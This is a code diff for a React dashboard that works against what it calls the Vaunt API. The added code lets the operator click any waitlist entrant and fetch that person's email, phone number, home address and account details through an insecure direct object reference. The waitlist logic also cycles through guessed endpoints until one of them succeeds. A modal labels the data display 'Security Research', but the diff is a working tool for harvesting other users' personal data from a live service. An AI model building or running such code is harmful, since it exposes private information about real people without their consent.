@@ -118,6 +118,8 @@ function Dashboard() {
   const [watchCity, setWatchCity] = useState('')
   const [watchList, setWatchList] = useState([])
   const [matches, setMatches] = useState([])
+  const [selectedUserDetails, setSelectedUserDetails] = useState(null)
+  const [loadingUserDetails, setLoadingUserDetails] = useState(false)
 
   const account = useMemo(() => ACCOUNTS[selectedAccountKey], [selectedAccountKey])
 
@@ -370,6 +372,7 @@ function Dashboard() {
       ]
 
       try {
+        let success = false
         for (const attempt of attempts) {
           appendLog(`Trying: ${attempt.method} ${attempt.endpoint}`, 'info')
           const res = await rawRequest(account.key, attempt.endpoint, {
@@ -385,9 +388,15 @@ function Dashboard() {
           
           if (res.ok) {
             appendLog(`✅ Successfully joined waitlist for flight #${flightId}!`, 'info')
-            await handleCheckAll()
+            success = true
             break
           }
+        }
+        
+        if (success) {
+          await handleCheckAll()
+        } else {
+          appendLog(`⚠️ All join attempts failed. Check logs above for details.`, 'warn')
         }
       } catch (err) {
         appendLog(`❌ Failed to join waitlist: ${err.message}`, 'error')
@@ -397,6 +406,35 @@ function Dashboard() {
     },
     [account.key, appendLog, rawRequest, handleCheckAll]
   )
+
+  const fetchUserDetails = useCallback(
+    async (userId) => {
+      setLoadingUserDetails(true)
+      appendLog(`🔍 Fetching PII details for user ${userId}...`, 'warn')
+      
+      try {
+        const res = await rawRequest(account.key, `/v1/user/${userId}`)
+        
+        if (res.ok && res.json) {
+          setSelectedUserDetails(res.json)
+          appendLog(`✅ Retrieved PII for user ${userId}`, 'warn')
+        } else {
+          appendLog(`❌ Failed to fetch user ${userId}: ${res.status}`, 'error')
+          setSelectedUserDetails({ error: `Failed to load user details (${res.status})` })
+        }
+      } catch (err) {
+        appendLog(`❌ Error fetching user details: ${err.message}`, 'error')
+        setSelectedUserDetails({ error: err.message })
+      } finally {
+        setLoadingUserDetails(false)
+      }
+    },
+    [account.key, appendLog, rawRequest]
+  )
+
+  const closeUserDetailsModal = useCallback(() => {
+    setSelectedUserDetails(null)
+  }, [])
 
   const attemptAutoBook = useCallback(
     async (flightId) => {
@@ -773,7 +811,13 @@ function Dashboard() {
                                 <tr key={`${flight.id}-${entrant.id}`} className="border-t border-slate-200">
                                   <td className="px-3 py-2 font-mono text-xs text-slate-600">{entrant.id}</td>
                                   <td className="px-3 py-2 text-slate-800">
-                                    {entrant.firstName} {entrant.lastName}
+                                    <button
+                                      onClick={() => fetchUserDetails(entrant.id)}
+                                      disabled={loadingUserDetails}
+                                      className="text-blue-600 hover:text-blue-800 hover:underline font-semibold cursor-pointer transition-colors"
+                                    >
+                                      {entrant.firstName} {entrant.lastName}
+                                    </button>
                                   </td>
                                   <td className="px-3 py-2 text-slate-600">
                                     #{entrant.queuePosition ?? '—'}
@@ -837,6 +881,121 @@ function Dashboard() {
           </ul>
         )}
       </div>
+
+      {/* User Details Modal */}
+      {selectedUserDetails && (
+        <div 
+          className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4"
+          onClick={closeUserDetailsModal}
+        >
+          <div 
+            className="bg-white rounded-xl shadow-2xl max-w-2xl w-full max-h-[90vh] overflow-y-auto"
+            onClick={(e) => e.stopPropagation()}
+          >
+            <div className="sticky top-0 bg-gradient-to-r from-red-500 to-orange-500 text-white p-6 rounded-t-xl">
+              <div className="flex justify-between items-start">
+                <div>
+                  <h3 className="text-2xl font-bold mb-2">⚠️ User PII Details (Security Research)</h3>
+                  <p className="text-sm text-red-100">
+                    This data is exposed via the Vaunt API to ANY authenticated user
+                  </p>
+                </div>
+                <button
+                  onClick={closeUserDetailsModal}
+                  className="text-white hover:text-red-200 text-2xl font-bold transition-colors"
+                >
+                  ×
+                </button>
+              </div>
+            </div>
+            
+            <div className="p-6">
+              {loadingUserDetails ? (
+                <div className="text-center py-12">
+                  <div className="inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"></div>
+                  <p className="mt-4 text-gray-600">Loading user details...</p>
+                </div>
+              ) : selectedUserDetails.error ? (
+                <div className="bg-red-50 border border-red-200 rounded-lg p-4 text-red-800">
+                  ❌ {selectedUserDetails.error}
+                </div>
+              ) : (
+                <div className="space-y-4">
+                  <div className="grid gap-4 md:grid-cols-2">
+                    <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
+                      <p className="text-xs text-blue-600 font-semibold uppercase mb-1">User ID</p>
+                      <p className="text-lg font-mono text-gray-900">{selectedUserDetails.id}</p>
+                    </div>
+                    <div className="bg-green-50 border border-green-200 rounded-lg p-4">
+                      <p className="text-xs text-green-600 font-semibold uppercase mb-1">Full Name</p>
+                      <p className="text-lg font-semibold text-gray-900">
+                        {selectedUserDetails.firstName} {selectedUserDetails.lastName}
+                      </p>
+                    </div>
+                    <div className="bg-purple-50 border border-purple-200 rounded-lg p-4">
+                      <p className="text-xs text-purple-600 font-semibold uppercase mb-1">📧 Email</p>
+                      <p className="text-base font-semibold text-gray-900 break-all">
+                        {selectedUserDetails.email || 'Not provided'}
+                      </p>
+                    </div>
+                    <div className="bg-amber-50 border border-amber-200 rounded-lg p-4">
+                      <p className="text-xs text-amber-600 font-semibold uppercase mb-1">📱 Phone</p>
+                      <p className="text-base font-semibold text-gray-900">
+                        {selectedUserDetails.phoneNumber || 'Not provided'}
+                      </p>
+                    </div>
+                    <div className="bg-pink-50 border border-pink-200 rounded-lg p-4">
+                      <p className="text-xs text-pink-600 font-semibold uppercase mb-1">Priority Score</p>
+                      <p className="text-sm font-mono text-gray-900">
+                        {formatPriorityScore(selectedUserDetails.priorityScore)}
+                      </p>
+                    </div>
+                    <div className="bg-indigo-50 border border-indigo-200 rounded-lg p-4">
+                      <p className="text-xs text-indigo-600 font-semibold uppercase mb-1">Membership Tier</p>
+                      <p className="text-lg font-semibold text-gray-900">
+                        {selectedUserDetails.license?.membershipTier?.name || 'Free / base'}
+                      </p>
+                    </div>
+                  </div>
+
+                  {selectedUserDetails.address && (
+                    <div className="bg-red-50 border-2 border-red-300 rounded-lg p-4">
+                      <p className="text-xs text-red-600 font-semibold uppercase mb-2">🏠 Address (Highly Sensitive)</p>
+                      <div className="text-sm text-gray-900 space-y-1">
+                        {selectedUserDetails.address.street && (
+                          <p className="font-semibold">{selectedUserDetails.address.street}</p>
+                        )}
+                        {selectedUserDetails.address.city && selectedUserDetails.address.state && (
+                          <p>{selectedUserDetails.address.city}, {selectedUserDetails.address.state} {selectedUserDetails.address.zip}</p>
+                        )}
+                        {selectedUserDetails.address.country && (
+                          <p>{selectedUserDetails.address.country}</p>
+                        )}
+                      </div>
+                    </div>
+                  )}
+
+                  <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
+                    <p className="text-xs text-gray-600 font-semibold uppercase mb-2">Raw JSON Response</p>
+                    <pre className="text-xs bg-gray-900 text-green-400 p-3 rounded overflow-x-auto">
+                      {JSON.stringify(selectedUserDetails, null, 2)}
+                    </pre>
+                  </div>
+
+                  <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-4">
+                    <p className="text-sm font-semibold text-yellow-900 mb-2">⚠️ Security Vulnerability</p>
+                    <p className="text-xs text-yellow-800">
+                      This demonstrates an IDOR (Insecure Direct Object Reference) vulnerability. Any authenticated 
+                      user can retrieve PII for ANY other user by simply knowing their user ID. This violates privacy 
+                      principles and exposes sensitive personal information.
+                    </p>
+                  </div>
+                </div>
+              )}
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   )
 }
